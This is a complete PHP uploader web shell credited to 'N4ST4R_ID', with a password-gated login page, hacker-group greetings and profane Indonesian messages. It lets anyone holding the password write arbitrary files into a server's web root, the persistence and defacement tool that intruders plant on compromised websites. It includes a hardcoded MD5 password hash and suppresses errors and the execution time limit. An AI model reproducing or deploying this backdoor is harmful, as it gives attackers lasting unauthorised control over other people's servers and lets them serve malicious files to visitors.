<?php
$nastar = "f5c9fcb342a5c8dabdf924407de15684"; //default jembodasw
session_start();
@error_reporting(0);
@set_time_limit(0);
function Login() {
?><!DOCTYPE html>
<html>
<head>
<link href='http://fonts.googleapis.com/css?family=Jolly Lodger' rel='stylesheet' type='text/css'>
  <title>Want to upload some file?</title>
 <body bgcolor="black">
 <center>
<font size='5' color='Red' face='Jolly+Lodger'>Login First Motherfucker</font><br>
<img src='https://4.bp.blogspot.com/-pkaH6OFZg2I/W3iX9Keb9vI/AAAAAAAAAhg/UB7expCtJFIa_-0txXAxC8MLhp-M9JNSgCLcBGAs/s1600/FB_IMG_15344461972281346.jpg' width='400' height='300'><br>
<form method="post">
<font face ='comic sans ms' size='3' color='red'>Password :
<input type="password" name="pass">
    <input type="submit" value="Login">
</form>
 </center>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($nastar) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $nastar) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        Login();
?>
<html>
<head>
<link href='http://fonts.googleapis.com/css?family=Orbitron' rel='stylesheet' type='text/css'>
<title>Uploader Psikont*l</title>
<meta name="author" content="N4ST4R_ID" />
<meta charset="UTF-8">
</head>
<body>
<style>
	html {
	background-position: center;
	background-color:#000000;
    height:99%;
    width:99%;
    background-attachment: fixed;
    background-size:100% 100%;
    background-image:url('https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcQZo1xA37yGb3_fKJe0bbdbz9mIzmUdk5MSy_vACGxdPxCcDPqk9bL7n6W-');
      }
      #menu a{
	padding:4px 20px;
	margin:0;
	background:#222222;
	letter-spacing:1px;
		width: 100%;
	height: 170px;
	 border: 1px solid #59fef1;box-shadow: 0px 0px 15px magenta;
	color: cyan;
	text-decoration: none;
}
    	.blink{
		width:200px;
		height: 50px;
		padding: 15px;	
		text-align: center;
		line-height: 50px;
	}
	span{
		font-size: 25px;
		color: cyan;
		animation: blink 1s linear infinite;
	}
@keyframes blink{
0%{opacity: 0;}
50%{opacity: .5;}
100%{opacity: 1;}
}
</style>
<center>
<div class="blink"><span>UPLOADER PSIKONT*L</span></div><br><br><br>
<marquee><font color="cyan" size="5">PSIKONT*L UPLOADER | PSIKONT*L UPLOADER | PSIKONT*L UPLOADER</marquee></font><br><br>
<font color="lime">
<?php
echo "Psikont*l Uploader By N4ST4R_ID<br><br>";
echo "<div id='menu'>";
echo "<a style='color: red;' href='?logout=true'>Logout</a></div><br><br><br>";
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='just_file'>
	  <input type='submit' name='upload' value='GO!1!1'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['just_file']['name'];
$dest = $root.'/'.$files;
	  if($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
	}
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['just_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "wizz anjing sukses euy -> <a href='$web$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "gagal upload ajg sadna...";
		}
	} else {
		if(@copy($_FILES['just_file']['tmp_name'], $files)) {
			echo " upload <b>$files</b> di folder ini";
		} else {
			echo "gagal tolo";
		}
	}
}
?>
<center>
<font face='orbitron' size='4' color='Aqua'>/!\ Official Indonesian Error System /!\</font><br>
<font face ='orbitron' size='3' color='red'><marquee behavior="alternate" scrollamount="11" width="40%" align="center">
N4ST4R_ID <font color="white">| ALX-04 | CIPPEL | boy NAinggolaN | R1c3-4 | dv347 | Mr.4r7Hu12 | M4RV3L_23 | MR.W4HYU</font></marquee><br>
<font face='orbitron' size='4' color='Aqua'>/!\ Greetz all my friend /!\</font><br>
<font face ='orbitron' size='3' color='red'><marquee behavior="alternate" scrollamount="11" width="40%" align="center"><b>MRAF04 | Mr.L3gacy | ./4rimaF0und | Korban_Kachang | Riz66Host | 4LM05TH3V!L</b></marquee></font><br><br><br>
<embed autoplay="true" height="0" loop="true" src="http://www.gamamanagement.ro/Inoue%20Joe%20Closer.mp3"></embed>
<font size='1' face="Verdana" color="#FFFFFF">&#174; 2018 N4ST4R_ID.</font>
</html>
